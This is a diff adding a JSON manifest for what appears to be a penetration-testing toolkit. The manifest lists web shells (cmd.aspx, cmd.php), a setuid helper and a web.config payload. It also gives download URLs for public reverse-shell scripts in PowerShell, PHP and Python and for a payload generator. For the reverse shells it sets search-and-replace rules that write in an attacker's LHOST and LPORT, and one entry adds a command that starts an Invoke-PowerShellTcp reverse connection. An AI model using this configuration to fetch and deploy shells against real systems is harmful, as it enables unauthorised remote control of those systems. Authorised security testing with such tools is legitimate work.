@@ -1,0 +1,71 @@
+{
+    "cmd.aspx": {
+        "location": "local"
+    },
+
+    "cmd.php": {
+        "location": "local",
+        "install_subdir": "php"
+    },
+
+    "Invoke-PowerShellTcp.ps1": {
+        "location": "remote",
+        "shell_type": "reverse",
+        "source_path": "https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1",
+        "postfix": "Invoke-PowerShellTcp -Reverse -IPAddress REPLACEME_LHOST -Port REPLACEME_LPORT\n"
+    },
+
+    "php-reverse-shell.php": {
+        "location": "remote",
+        "shell_type": "reverse",
+        "source_path": "https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php",
+        "install_subdir": "php",
+        "search_and_replace": [
+            [
+                "$ip = '127.0.0.1';  // CHANGE THIS",
+                "$ip = 'REPLACEME_LHOST';"
+            ],
+            [
+                "$port = 1234;       // CHANGE THIS",
+                "$port = REPLACEME_LPORT;"
+            ]
+        ]
+    },
+
+    "setuid.c": {
+        "location": "local"
+    },
+
+    "tcp_pty_backconnect.py": {
+        "location": "remote",
+        "shell_type": "reverse",
+        "source_path": "https://raw.githubusercontent.com/infodox/python-pty-shells/master/tcp_pty_backconnect.py",
+        "install_subdir": "python-pty-shells",
+        "search_and_replace": [
+            [
+                "lhost = \"127.0.0.1\" # XXX: CHANGEME",
+                "lhost = \"REPLACEME_LHOST\""
+            ],
+            [
+                "lport = 31337 # XXX: CHANGEME",
+                "lport = REPLACEME_LPORT"
+            ]
+        ]
+    },
+
+    "tcp_pty_shell_handler.py": {
+        "location": "remote",
+        "source_path": "https://github.com/infodox/python-pty-shells/raw/master/tcp_pty_shell_handler.py",
+        "install_subdir": "python-pty-shells"
+    },
+
+    "unicorn.py": {
+        "location": "remote",
+        "source_path": "https://github.com/trustedsec/unicorn/raw/master/unicorn.py"
+    },
+
+    "web.config": {
+        "location": "local",
+        "type": "reverse"
+    }
+}
